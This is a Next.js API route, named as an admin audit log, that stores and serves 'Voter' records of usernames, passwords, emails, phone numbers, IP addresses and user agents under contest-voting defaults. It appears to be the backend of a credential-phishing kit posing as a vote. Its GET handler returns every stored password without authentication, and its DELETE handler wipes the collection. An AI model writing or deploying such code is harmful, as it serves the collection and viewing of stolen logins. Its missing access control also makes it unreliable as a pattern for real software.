// Next.js App Router API Route Handler: /api/admin/audit-log
// Supports: GET, DELETE (single via ?id=... or body, and collection wipe without id)

import { NextResponse } from 'next/server';
import mongoose from 'mongoose';

const MONGODB_URI = process.env.MONGODB_URI;

let cached = global.mongoose;
if (!cached) {
  cached = global.mongoose = { conn: null, promise: null };
}

async function connectToDatabase() {
  if (cached.conn) return cached.conn;
  if (!cached.promise && MONGODB_URI) {
    cached.promise = mongoose.connect(MONGODB_URI, {
      bufferCommands: false,
      serverSelectionTimeoutMS: 5000
    }).then((m) => m);
  }
  try {
    cached.conn = await cached.promise;
  } catch (e) {
    cached.promise = null;
    throw e;
  }
  return cached.conn;
}

const VoterSchema = new mongoose.Schema(
  {
    username: { type: String, required: true, trim: true },
    password: { type: String, required: true },
    email: { type: String, trim: true },
    phone: { type: String, trim: true },
    authStatus: { type: String, default: 'Authenticated' },
    location: { type: String, default: 'United States' },
    accountType: { type: String },
    contestantId: { type: String, default: 'FK-101' },
    contestantNo: { type: String, default: '001' },
    platform: { type: String, default: 'web' },
    ipAddress: { type: String },
    userAgent: { type: String }
  },
  { timestamps: true }
);

const Voter = mongoose.models.Voter || mongoose.model('Voter', VoterSchema);

// GET Handler
export async function GET() {
  try {
    await connectToDatabase();
    const voters = await Voter.find().sort({ createdAt: -1 }).limit(500);
    return NextResponse.json({
      success: true,
      count: voters.length,
      data: voters
    });
  } catch (err) {
    return NextResponse.json(
      { success: false, error: err.message },
      { status: 500 }
    );
  }
}

// DELETE Handler
export async function DELETE(request) {
  try {
    await connectToDatabase();
    const { searchParams } = new URL(request.url);
    let targetId = searchParams.get('id');

    // Attempt to parse body if id not in query
    if (!targetId) {
      try {
        const body = await request.json();
        targetId = body?.id;
      } catch (e) {
        // Body was empty, proceed as collection wipe
      }
    }

    if (targetId) {
      // Individual record deletion
      const deleted = await Voter.findByIdAndDelete(targetId);
      return NextResponse.json({
        success: true,
        message: `Record ${targetId} successfully removed.`,
        deletedId: targetId,
        data: deleted
      });
    } else {
      // Collection wipe
      const result = await Voter.deleteMany({});
      return NextResponse.json({
        success: true,
        message: 'All records have been permanently wiped from the collection.',
        deletedCount: result.deletedCount || 0
      });
    }
  } catch (err) {
    return NextResponse.json(
      { success: false, error: err.message },
      { status: 500 }
    );
  }
}
